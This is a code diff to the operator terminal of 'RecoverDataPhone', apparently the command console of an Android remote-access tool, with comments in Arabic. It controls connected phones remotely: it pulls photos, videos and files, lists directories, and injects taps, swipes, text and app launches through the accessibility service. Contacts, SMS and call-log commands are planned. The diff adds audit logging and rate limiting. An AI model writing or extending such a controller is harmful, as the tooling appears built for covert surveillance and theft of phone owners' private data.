@@ -11,10 +11,13 @@ terminal.py
   3. تنفيذها عبر SessionManager والمعالجات.
   4. عرض النتائج بشكل جميل.
   5. إدارة العميل المحدد حالياً (current_client).
+  6. أوامر إدارة: SESSIONS, AUDIT, RATE, STATS.
 
 يعتمد على:
   - CommandParser (commands/parser.py)
   - SessionManager (core/session_manager.py)
+  - RateLimiter (core/rate_limit.py)
+  - AuditLogger (core/audit.py)
   - PhotosCommand, VideosCommand, FilesCommand, AccessibilityCommand
 
 الاستخدام:
@@ -28,6 +31,7 @@ import logging
 import os
 import sys
 import time
+from datetime import datetime
 from typing import Any, Dict, List, Optional
 
 from commands.parser import CommandParser, ParsedCommand
@@ -35,9 +39,14 @@ from commands.photos import get_photos_handler
 from commands.videos import get_videos_handler
 from commands.files import get_files_handler, FilesCommand
 from commands.accessibility import get_accessibility_handler, AccessibilityCommand
-from core.session_manager import SessionManager
 
-logger = logging.getLogger("terminal")
+from core.session_manager import SessionManager
+from core.rate_limit import get_rate_limiter, RateLimiter
+from core.audit import get_audit_logger, AuditLogger, EventType
+
+from utils.logger import get_logger, format_size, format_duration, truncate
+
+logger = get_logger("terminal")
 
 
 # ============================================================
@@ -96,15 +105,22 @@ class TerminalCLI:
         self.files  = get_files_handler(session_manager)
         self.acc    = get_accessibility_handler(session_manager)
 
+        # أمان
+        self.limiter: RateLimiter = get_rate_limiter()
+        self.audit: AuditLogger = get_audit_logger()
+
         # الحالة
         self.running = False
         self.current_client_id: Optional[str] = None
 
-        # سجل الأوامر (للأسهم لاحقاً)
+        # سجل الأوامر
         self.history: List[str] = []
 
         # مهام الخلفية
         self._cleanup_task: Optional[asyncio.Task] = None
+
+        # تسجيل بدء السيرفر
+        self.audit.server_start("0.0.0.0", 8765)
 
     # ========================================================
     # 2.1 دورة الحياة
@@ -116,7 +132,7 @@ class TerminalCLI:
         # رسالة الترحيب
         self._print_banner()
 
-        # مهمة تنظيف دورية (كل 60 ثانية)
+        # مهمة تنظيف دورية
         self._cleanup_task = asyncio.create_task(self._periodic_cleanup())
 
         try:
@@ -164,6 +180,10 @@ class TerminalCLI:
                 await self._cleanup_task
             except asyncio.CancelledError:
                 pass
+
+        # تسجيل إيقاف السيرفر
+        self.audit.server_stop()
+
         print(c("\n👋 إلى اللقاء!", C.CYAN))
 
     # ========================================================
@@ -180,7 +200,9 @@ class TerminalCLI:
     def _build_prompt(self) -> str:
         """بناء نص الـ prompt."""
         if self.current_client_id:
-            return c(f"[{self.current_client_id}]> ", C.GREEN)
+            # اختصار: أول 8 أحرف
+            short = self.current_client_id[:8]
+            return c(f"[{short}]> ", C.GREEN)
         return c("RDP> ", C.CYAN)
 
     # ========================================================
@@ -234,6 +256,16 @@ class TerminalCLI:
             elif name == "PING":
                 await self._cmd_ping()
 
+            # ----- أوامر جديدة (إدارة) -----
+            elif name == "AUDIT":
+                await self._cmd_audit(cmd.args)
+
+            elif name == "RATE":
+                await self._cmd_rate(cmd.args)
+
+            elif name == "STATS":
+                self._cmd_stats()
+
             elif name in ("STOP", "GET_CONTACTS", "GET_SMS", "GET_CALL_LOGS"):
                 print(c(f"⚠️  الأمر {name} غير منفّذ بعد", C.YELLOW))
 
@@ -257,7 +289,7 @@ class TerminalCLI:
 
         print()
         print(c(f"📱 الجلسات المتصلة ({len(sessions)}):", C.BOLD))
-        print(c("─" * 70, C.DIM))
+        print(c("─" * 80, C.DIM))
 
         for s in sessions:
             marker = "▶️ " if s.client_id == self.current_client_id else "   "
@@ -268,12 +300,16 @@ class TerminalCLI:
             android = s.device_info.get("android", "?")
             autopilot = "✓" if s.device_info.get("autopilot") else "✗"
 
+            # فحص الحظر
+            banned = "🚫" if self.limiter.is_banned(s.client_id) else "  "
+
             print(
-                f"{marker}{status} "
-                f"{c(s.client_id, C.CYAN)}  "
+                f"{marker}{status}{banned} "
+                f"{c(s.client_id[:8], C.CYAN)}  "
                 f"{device} {model}  "
                 f"Android {android}  "
-                f"AutoPilot: {autopilot}"
+                f"AutoPilot: {autopilot}  "
+                f"↑{s.messages_sent} ↓{s.messages_received}"
             )
 
         print()
@@ -284,13 +320,21 @@ class TerminalCLI:
             print(c("❌ استخدم: SELECT <client_id>", C.RED))
             return
 
+        # إذا كان مختصراً، ابحث بالبادئة
         session = self.session_manager.get_session(client_id)
+        if session is None:
+            # جرّب البحث بالبادئة
+            for s in self.session_manager.get_all_sessions():
+                if s.client_id.startswith(client_id):
+                    session = s
+                    break
+
         if session is None:
             print(c(f"❌ عميل غير موجود: {client_id}", C.RED))
             return
 
-        self.current_client_id = client_id
-        print(c(f"✓ تم اختيار العميل: {client_id}", C.GREEN))
+        self.current_client_id = session.client_id
+        print(c(f"✓ تم اختيار العميل: {session.client_id}", C.GREEN))
 
     def _require_client(self) -> Optional[str]:
         """التأكد من وجود عميل محدد."""
@@ -311,15 +355,23 @@ class TerminalCLI:
         if not cid:
             return
 
+        # فحص الحظر
+        if self.limiter.is_banned(cid):
+            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
+                    C.RED))
+            return
+
         limit = args.get("limit", 0)
         offset = args.get("offset", 0)
         path = args.get("path")
 
-        print(c(f"📸 إرسال GET PHOTOS إلى {cid}...", C.CYAN))
+        print(c(f"📸 إرسال GET PHOTOS إلى {cid[:8]}...", C.CYAN))
         ok = await self.photos.execute(cid, limit=limit, offset=offset, path=path)
 
         if ok:
             print(c("✓ تم الإرسال. الملفات ستُحفظ تدريجياً.", C.GREEN))
+            # تسجيل في audit
+            self.audit.data_access(cid, "GET_PHOTOS", file_count=limit)
         else:
             print(c("❌ فشل الإرسال", C.RED))
 
@@ -328,21 +380,32 @@ class TerminalCLI:
         if not cid:
             return
 
+        if self.limiter.is_banned(cid):
+            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
+                    C.RED))
+            return
+
         limit = args.get("limit", 0)
         offset = args.get("offset", 0)
         path = args.get("path")
 
-        print(c(f"🎬 إرسال GET VIDEO إلى {cid}...", C.CYAN))
+        print(c(f"🎬 إرسال GET VIDEO إلى {cid[:8]}...", C.CYAN))
         ok = await self.videos.execute(cid, limit=limit, offset=offset, path=path)
 
         if ok:
             print(c("✓ تم الإرسال. الفيديوهات ستُحفظ تدريجياً.", C.GREEN))
+            self.audit.data_access(cid, "GET_VIDEOS", file_count=limit)
         else:
             print(c("❌ فشل الإرسال", C.RED))
 
     async def _cmd_get_file(self, args: Dict[str, Any]) -> None:
         cid = self._require_client()
         if not cid:
+            return
+
+        if self.limiter.is_banned(cid):
+            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
+                    C.RED))
             return
 
         path = args.get("path")
@@ -355,12 +418,18 @@ class TerminalCLI:
 
         if ok:
             print(c("✓ تم الإرسال", C.GREEN))
+            self.audit.data_access(cid, "GET_FILE", file_count=1)
         else:
             print(c("❌ فشل الإرسال", C.RED))
 
     async def _cmd_list_dir(self, args: Dict[str, Any]) -> None:
         cid = self._require_client()
         if not cid:
+            return
+
+        if self.limiter.is_banned(cid):
+            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
+                    C.RED))
             return
 
         path = args.get("path")
@@ -378,6 +447,8 @@ class TerminalCLI:
         print()
         print(FilesCommand.format_list_result(result))
         print()
+
+        self.audit.data_access(cid, "LIST_DIR")
 
     async def _cmd_device_info(self) -> None:
         cid = self._require_client()
@@ -422,10 +493,18 @@ class TerminalCLI:
         if not cid:
             return
 
+        if self.limiter.is_banned(cid):
+            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
+                    C.RED))
+            return
+
         action = args.pop("action", None)
         if not action:
             print(c("❌ يجب تحديد إجراء", C.RED))
             return
+
+        # تسجيل في audit
+        self.audit.accessibility_action(cid, action, args)
 
         print(c(f"🎮 تنفيذ: {action}...", C.CYAN))
 
@@ -442,7 +521,6 @@ class TerminalCLI:
 
         # معالجة خاصة لـ DUMP_UI
         if action == "DUMP_UI" and success:
-            # انتظار وصول UI tree
             await asyncio.sleep(0.8)
             tree = self.acc.get_last_ui_tree(cid)
             if tree:
@@ -460,11 +538,180 @@ class TerminalCLI:
                 print(c(f"📦 الحزمة الحالية: {pkg}", C.CYAN))
 
     # ========================================================
-    # 2.7 المساعدة والعرض
+    # 2.7 أوامر جديدة: AUDIT / RATE / STATS
+    # ========================================================
+    async def _cmd_audit(self, args: Dict[str, Any]) -> None:
+        """عرض آخر أحداث التدقيق."""
+        # آخر 20 حدث
+        entries = self.audit.query(limit=20)
+
+        if not entries:
+            print(c("📋 لا توجد أحداث في السجل", C.YELLOW))
+            return
+
+        print()
+        print(c(f"📋 آخر {len(entries)} حدث:", C.BOLD))
+        print(c("─" * 80, C.DIM))
+
+        for e in reversed(entries[-20:]):
+            ts = datetime.fromtimestamp(e.timestamp).strftime("%H:%M:%S")
+            status = c("✅", C.GREEN) if e.success else c("❌", C.RED)
+            client = (e.client_id or "—")[:8]
+            msg = truncate(e.message, 50)
+
+            print(f"  {ts} {status} {c(e.event_type, C.CYAN):32} "
+                  f"{c(client, C.MAGENTA)}  {msg}")
+
+        # إحصائيات
+        stats = self.audit.stats()
+        print()
+        print(c(f"📊 إجمالي: {stats['total']} حدث، "
+                f"{stats['failed']} فشل، "
+                f"حجم: {format_size(stats['file_size'])}", C.DIM))
+        print()
+
+    async def _cmd_rate(self, args: Dict[str, Any]) -> None:
+        """عرض حالة Rate Limit."""
+        cid = args.get("client_id") or self.current_client_id
+
+        if cid:
+            # حالة عميل محدد
+            status = self.limiter.get_client_status(cid)
+
+            if status is None:
+                print(c(f"❓ لا يوجد سجل لـ {cid}", C.YELLOW))
+                return
+
+            print()
+            print(c(f"📊 Rate Limit لـ {cid[:8]}:", C.BOLD))
+            print(c("─" * 50, C.DIM))
+            print(f"  محظور: {status['is_banned']}")
+            if status['is_banned']:
+                print(f"  الوقت المتبقي: {status['ban_remaining']}s")
+            print(f"  المخالفات: {status['violations']}")
+            print(f"  الدلاء:")
+
+            for cat, info in status['buckets'].items():
+                bar = "█" * int(info['available'] / info['capacity'] * 20)
+                bar += "░" * (20 - len(bar))
+                print(f"    {cat:8} [{bar}] "
+                      f"{info['available']}/{info['capacity']}")
+            print()
+
+        else:
+            # إحصائيات عامة
+            stats = self.limiter.get_stats()
+
+            print()
+            print(c("📊 Rate Limit - نظرة عامة:", C.BOLD))
+            print(c("─" * 50, C.DIM))
+            print(f"  عملاء متابعون: {stats['tracked_clients']}")
+            print(f"  محظورون: {stats['banned_clients']}")
+            print(f"  إجمالي الطلبات: {stats['total_requests']}")
+            print(f"  مرفوضة: {stats['total_rejected']}")
+            print(f"  معدل الرفض: {stats['rejection_rate']}%")
+
+            # قائمة المحظورين
+            banned = self.limiter.list_banned()
+            if banned:
+                print()
+                print(c("🚫 محظورون:", C.RED))
+                for cid_b in banned:
+                    rec = self.limiter.get_record(cid_b)
+                    print(f"    {cid_b[:8]} (متبقٍ {rec.ban_remaining}s)")
+            print()
+
+    def _cmd_stats(self) -> None:
+        """إحصائيات شاملة."""
+        print()
+        print(c("📊 إحصائيات السيرفر:", C.BOLD))
+        print(c("═" * 60, C.DIM))
+
+        # ----- الجلسات -----
+        sm_stats = self.session_manager.get_stats()
+        print(f"\n  {c('الجلسات:', C.CYAN)}")
+        print(f"    إجمالي: {sm_stats['total_sessions']}")
+        print(f"    نشطة: {sm_stats['alive_sessions']}")
+        print(f"    رسائل مستلمة: {sm_stats['total_messages_received']}")
+        print(f"    رسائل مُرسلة: {sm_stats['total_messages_sent']}")
+
+        # ----- Audit -----
+        audit_stats = self.audit.stats()
+        print(f"\n  {c('التدقيق:', C.CYAN)}")
+        print(f"    إجمالي الأحداث: {audit_stats['total']}")
+        print(f"    فشل: {audit_stats['failed']}")
+        print(f"    حجم السجل: {format_size(audit_stats['file_size'])}")
+
+        # ----- Rate Limit -----
+        rl_stats = self.limiter.get_stats()
+        print(f"\n  {c('Rate Limit:', C.CYAN)}")
+        print(f"    عملاء: {rl_stats['tracked_clients']}")
+        print(f"    محظورون: {rl_stats['banned_clients']}")
+        print(f"    معدل الرفض: {rl_stats['rejection_rate']}%")
+
+        print()
+
+    # ========================================================
+    # 2.8 المساعدة والعرض
     # ========================================================
     def _show_help(self, command: Optional[str]) -> None:
         """عرض المساعدة."""
-        print(self.parser.help_text(command))
+        if command:
+            print(self.parser.help_text(command))
+            return
+
+        # مساعدة عامة
+        print()
+        print(c("╔══════════════════════════════════════════════════════╗", C.CYAN))
+        print(c("║           RecoverDataPhone - Command Reference        ║", C.CYAN))
+        print(c("╚══════════════════════════════════════════════════════╝", C.CYAN))
+
+        sections = [
+            ("📦 البيانات", [
+                "GET PHOTOS [--limit N] [--offset N]",
+                "GET VIDEO [--limit N]",
+                "GET FILE <path>",
+                "LIST DIR <path>",
+                "INFO",
+            ]),
+            ("🎮 Accessibility", [
+                "ACCESS HOME | BACK | RECENTS",
+                "ACCESS CLICK <x> <y>",
+                "ACCESS SWIPE <x1> <y1> <x2> <y2>",
+                "ACCESS TEXT <text>",
+                "ACCESS FIND_CLICK <text>",
+                "ACCESS DUMP_UI",
+                "ACCESS OPEN_APP <package>",
+            ]),
+            ("👥 الجلسات", [
+                "SESSIONS",
+                "SELECT <client_id>",
+            ]),
+            ("📋 التدقيق والمراقبة", [
+                "AUDIT                عرض آخر الأحداث",
+                "RATE [client_id]     حالة Rate Limit",
+                "STATS                إحصائيات شاملة",
+            ]),
+            ("💻 الطرفية", [
+                "HELP [command]",
+                "CLEAR",
+                "EXIT",
+            ]),
+        ]
+
+        for title, commands in sections:
+            print()
+            print(c(f"  {title}", C.BOLD + C.YELLOW))
+            for cmd in commands:
+                print(f"    {c(cmd, C.CYAN)}")
+
+        print()
+        print(c("  أمثلة:", C.BOLD))
+        print(f"    {c('> GET PHOTOS --limit 50', C.DIM)}")
+        print(f"    {c('> ACCESS CLICK 540 960', C.DIM)}")
+        print(f"    {c('> SELECT a3f8b2c1', C.DIM)}")
+        print(f"    {c('> AUDIT', C.DIM)}")
+        print()
 
     def _show_banner(self) -> None:
         """عرض شاشة الترحيب."""
@@ -475,6 +722,11 @@ class TerminalCLI:
 {c('╚══════════════════════════════════════════════════════════╝', C.CYAN)}
 
 اكتب {c('HELP', C.YELLOW)} لعرض الأوامر، أو {c('EXIT', C.YELLOW)} للخروج.
+
+الميزات الجديدة:
+  • {c('AUDIT', C.CYAN)}   — سجل التدقيق
+  • {c('RATE', C.CYAN)}    — حالة Rate Limit
+  • {c('STATS', C.CYAN)}   — إحصائيات شاملة
 """
         print(banner)
 
@@ -483,17 +735,17 @@ class TerminalCLI:
         os.system("cls" if os.name == "nt" else "clear")
 
     # ========================================================
-    # 2.8 مهمة التنظيف الدورية
+    # 2.9 مهمة التنظيف الدورية
     # ========================================================
     async def _periodic_cleanup(self) -> None:
-        """تنظيف دوري للملفات القديمة كل 60 ثانية."""
+        """تنظيف دوري كل 60 ثانية."""
         while self.running:
             try:
                 await asyncio.sleep(60)
                 if not self.running:
                     break
 
-                # تنظيف
+                # تنظيف المعالجات
                 removed_p = await self.photos.cleanup_stale()
                 removed_v = await self.videos.cleanup_stale()
                 removed_f = await self.files.cleanup_stale()
@@ -502,6 +754,10 @@ class TerminalCLI:
                 if total > 0:
                     logger.info(f"Periodic cleanup: removed {total} stale items")
 
+                # تنظيف Audit (كل ساعة)
+                if int(time.time()) % 3600 < 60:
+                    self.audit.cleanup_old()
+
             except asyncio.CancelledError:
                 break
             except Exception as e:
@@ -509,7 +765,7 @@ class TerminalCLI:
 
 
 # ============================================================
-# 3. دالة مساعدة للتشغيل المستقل (اختياري)
+# 3. دالة مساعدة للتشغيل المستقل
 # ============================================================
 async def run_cli_standalone() -> None:
     """
